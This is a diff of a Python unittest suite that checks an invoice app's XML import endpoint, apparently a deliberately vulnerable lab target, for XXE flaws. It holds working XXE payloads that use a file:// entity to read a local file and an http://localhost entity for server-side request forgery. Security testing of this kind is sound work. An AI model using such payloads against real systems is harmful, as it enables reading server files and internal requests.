@@ -25,7 +25,7 @@ load_dotenv()
 logger.info("Environment variables loaded")
 
 # Configuration
-API_URL = os.getenv('API_URL', 'http://localhost:3000')
+API_URL = os.getenv('API_URL', 'http://localhost:3000')  # Updated to use port 3000
 TEST_PORT = int(os.getenv('TEST_PORT', '8891'))  # Using a different port from SSRF/SSTI tests
 logger.info("Configuration loaded: API_URL=%s, TEST_PORT=%d", API_URL, TEST_PORT)
 
@@ -114,22 +114,28 @@ class TestXMLVulnerabilities(unittest.TestCase):
     
     def setUp(self):
         self.base_url = API_URL
-        # Create test file
-        with open('/tmp/xxe_test.txt', 'w') as f:
-            f.write('XXE_TEST_CONTENT')
+        # Create test file inside Docker container
+        import subprocess
+        subprocess.run(['docker', 'exec', 'invoicer-invoicer-1', '/bin/sh', '-c', 'echo "XXE_TEST_CONTENT" > /tmp/xxe_test.txt'])
         logger.info("[Test] Created test file with content")
     
     def tearDown(self):
-        if os.path.exists('/tmp/xxe_test.txt'):
-            os.remove('/tmp/xxe_test.txt')
-            logger.info("[Test] Removed test file")
+        # Remove test file from Docker container
+        import subprocess
+        subprocess.run(['docker', 'exec', 'invoicer-invoicer-1', '/bin/sh', '-c', 'rm -f /tmp/xxe_test.txt'])
+        logger.info("[Test] Removed test file")
     
     def test_invoice_xxe_file_read(self):
         """Test XXE vulnerability in invoice import endpoint"""
         logger.info("[Test] Starting XXE file read test...")
         xml_payload = '''<?xml version="1.0" encoding="UTF-8"?>
-        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///tmp/xxe_test.txt">]>
-        <invoice><customer>Test</customer><items><item>&xxe;</item></items></invoice>'''
+        <!DOCTYPE invoice [<!ENTITY xxe SYSTEM "file:///tmp/xxe_test.txt">]>
+        <invoice>
+            <customer>&xxe;</customer>
+            <items>
+                <item>Test Item</item>
+            </items>
+        </invoice>'''
         
         logger.info("[Test] Sending XXE file read request...")
         try:
@@ -137,7 +143,7 @@ class TestXMLVulnerabilities(unittest.TestCase):
                 f'{self.base_url}/api/invoice/import/xml',
                 data=xml_payload,
                 headers={'Content-Type': 'application/xml'},
-                timeout=10  # 10 seconds timeout
+                timeout=10
             )
             
             logger.info("[Test] Response status: %d", response.status_code)
@@ -146,7 +152,7 @@ class TestXMLVulnerabilities(unittest.TestCase):
             self.assertEqual(response.status_code, 200)
             response_data = response.json()
             self.assertTrue(response_data['success'])
-            self.assertIn('XXE_TEST_CONTENT', response_data['data']['items'][0])
+            self.assertIn('XXE_TEST_CONTENT', response_data['data']['customer'])
             logger.info("[Test] XXE file read test passed")
         except requests.Timeout:
             logger.error("[Test] Request timed out after 10 seconds")
@@ -159,8 +165,13 @@ class TestXMLVulnerabilities(unittest.TestCase):
         """Test SSRF via XXE in invoice import endpoint"""
         logger.info("[Test] Starting XXE SSRF test...")
         xml_payload = '''<?xml version="1.0" encoding="UTF-8"?>
-        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8891/xxe-test">]>
-        <invoice><customer>Test</customer><items><item>&xxe;</item></items></invoice>'''
+        <!DOCTYPE invoice [<!ENTITY xxe SYSTEM "http://localhost:8891/xxe-test">]>
+        <invoice>
+            <customer>&xxe;</customer>
+            <items>
+                <item>Test Item</item>
+            </items>
+        </invoice>'''
         
         logger.info("[Test] Making XXE SSRF request to http://localhost:8891/xxe-test")
         try:
@@ -177,7 +188,7 @@ class TestXMLVulnerabilities(unittest.TestCase):
             self.assertEqual(response.status_code, 200)
             response_data = response.json()
             self.assertTrue(response_data['success'])
-            self.assertIn('XXE Test Response', response_data['data']['items'][0])
+            self.assertIn('XXE Test Response', response_data['data']['customer'])
             logger.info("[Test] XXE SSRF test passed")
         except requests.Timeout:
             logger.error("[Test] Request timed out after 10 seconds")
